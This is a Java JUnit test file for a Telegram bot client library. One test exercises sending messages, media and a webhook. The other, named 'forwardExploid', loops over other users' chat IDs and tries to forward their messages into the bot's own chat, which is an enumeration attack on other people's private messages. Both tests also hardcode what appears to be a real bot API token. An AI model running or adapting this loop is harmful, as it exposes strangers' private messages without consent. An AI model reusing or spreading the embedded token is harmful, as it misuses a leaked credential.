package de.raysha.lib.telegram.bot.api;

import de.raysha.lib.telegram.bot.api.exception.BotException;
import de.raysha.lib.telegram.bot.api.model.ForceReply;
import de.raysha.lib.telegram.bot.api.model.Message;
import de.raysha.lib.telegram.bot.api.model.ReplyKeyboardMarkup;
import de.raysha.lib.telegram.bot.api.model.UserProfilePhotos;
import org.junit.Ignore;
import org.junit.Test;

import java.io.File;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by rainu on 29.06.15.
 */
@Ignore
public class TelegramBotTest {
    private final int chatId = 5388415;

    @Test
    public void test() throws BotException, URISyntaxException {
        TelegramBot bot = new TelegramBot("118902677:AAHi9-YPsQxql4ZnX3AHmVsaeGQXl85XhBI");

        System.out.println(bot.getMe());
        System.out.println(bot.getUpdates(null, null, null));

        ReplyKeyboardMarkup keyboardMarkup = new ReplyKeyboardMarkup();
        keyboardMarkup.setKeyboard(new ArrayList<List<String>>());
        keyboardMarkup.getKeyboard().add(new ArrayList<String>());
        keyboardMarkup.getKeyboard().get(0).add("Hallo!");

        ForceReply forceReply = new ForceReply();
        forceReply.setForce_reply(true);

        Message m = bot.sendMessage(chatId, "Hello World!", true, null, keyboardMarkup);
        System.out.println(m);

        m = bot.forwardMessage(chatId, chatId, 35);
        System.out.println(m);

        File testPic = new File(TelegramBotTest.class.getResource("/test-pic.jpg").toURI());
        m = bot.sendPhoto(chatId, "AgADBAADrKcxG5VPFgd4AAHn2vMuWcyS2GEwAATOCCY0hKYN0S_cAQABAg");
        System.out.println(m);

        File testAudio = new File(TelegramBotTest.class.getResource("/test-audio.ogg").toURI());
        m = bot.sendAudio(chatId, "AwADBAADAQADlU8WBzGpQHJe2kESAg");
        System.out.println(m);

        File testDoc = new File(TelegramBotTest.class.getResource("/test-doc.txt").toURI());
        m = bot.sendDocument(chatId, "BQADBAADAwADlU8WB4goT_76Kly8Ag");
        System.out.println(m);

        File testSticker = new File(TelegramBotTest.class.getResource("/test-sticker.webp").toURI());
        m = bot.sendSticker(chatId, "BQADBAADBAADlU8WB588LPk7pVZFAg");
        System.out.println(m);

        File testVid = new File(TelegramBotTest.class.getResource("/test-vid.mp4").toURI());
        m = bot.sendVideo(chatId, "BAADBAADBgADlU8WB6nx1oEiudxuAg");
        System.out.println(m);

        m = bot.sendLocation(chatId, 13.12f, 13.08f);
        System.out.println(m);

        bot.sendChatAction(chatId, BotAPI.ChatAction.typing);

        UserProfilePhotos userPhotos = bot.getUserProfilePhotos(5388415);
        System.out.println(userPhotos);

        bot.setWebhook("https://raysha.de/bot");
        bot.setWebhook(null);
    }

    @Test
    public void forwardExploid(){
        BotAPI bot = new TelegramBot("118902677:AAHi9-YPsQxql4ZnX3AHmVsaeGQXl85XhBI");

        final int targetChat = chatId;
        final int sourceChat = chatId + 6;

        for(int j=chatId; j >= 10000; j--) {
            for (int i = 1; i < 2; i++) {
                try {
                    bot.forwardMessage(targetChat, j, i);
                    System.out.println("Found " + j);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
